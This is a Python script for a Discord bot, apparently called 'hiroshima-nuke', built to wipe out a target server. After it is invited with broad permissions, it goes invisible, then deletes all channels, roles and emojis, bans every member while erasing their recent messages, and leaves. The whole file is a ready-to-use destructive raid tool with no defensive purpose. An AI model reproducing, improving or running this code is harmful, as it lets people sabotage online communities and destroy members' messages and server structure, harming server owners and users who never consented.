#!/usr/bin/python
"""
# Author: Ryan Lee / Naeng#0001
# License: Public
# Guide on https://github.com/itsnaeng/hiroshima-nuke
"""

import discord
import asyncio

# Enter your bot token before you start
# Start off by finding it from https://discordapp.com/developers/applications/

TOKEN = input('Enter bot token: ') 
client = discord.Client()

@client.event
async def on_ready():
    print('------')
    print('Logged in as "{name}" (ID: {id})'.format(name=client.user.name, id=client.user.id))
    print('...')
    print('Here\'s the invite link for your bot!')
    print('https://discordapp.com/api/oauth2/authorize?client_id={id}&permissions=1342178358&scope=bot'.format(id=client.user.id))
    await client.change_presence(status=discord.Status.invisible)
    while True:
        try:
            server_id = int(input('Enter the server ID: '))
            break
        except ValueError:
            print('Invalid Option')
            continue
    print('------')
    for guild in client.guilds:
        if guild.id == server_id:
            print('Discord server "{}" was selected as a target...'.format(guild.name))
            print('...')
            print('Before we start, is there a ban reason? (Leave blank for no reason)')
            ban_reason = input('Enter Ban Reason: ')
            print('------')
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print (f"[CHANNEL DELETED] {channel.name} in '{guild.name}'")
                except:
                    print (f"[CHANNEL NOT DELETED] {channel.name} in '{guild.name}'")
            for role in guild.roles:
                try:
                    await role.delete()
                    print (f"[ROLE DELETED] {role.name} in '{guild.name}'")
                except:
                    print (f"[ROLE NOT DELETED] {role.name} in '{guild.name}'")
            for member in guild.members:
                try:
                    await member.ban(reason=ban_reason, delete_message_days=7)
                    print (f"[BANNED] {member.name} in '{guild.name}'")
                except:
                    print (f"[FAIL BAN] {member.name} in '{guild.name}'")
            for emoji in guild.emojis:
                print(emoji)
                try:
                    await emoji.delete()
                    print (f"[EMOJI DELETED] {emoji.name} in '{guild.name}'")
                except:
                    print (f"[EMOJI NOT DELETED] {emoji.name} in '{guild.name}'")
            print('Left the server...')
            print('Reason: Finished or kicked')
            print('------')
            print('All Task Completed')
            await guild.leave()
            break
    else:
        print('There was no task, the bot was not in the server provided.')
        raise SystemExit

@client.event
async def on_guild_remove(self):
    print('Bot was removed server')
    print('Exiting the script')
    print('------')
    raise SystemExit

client.run(TOKEN)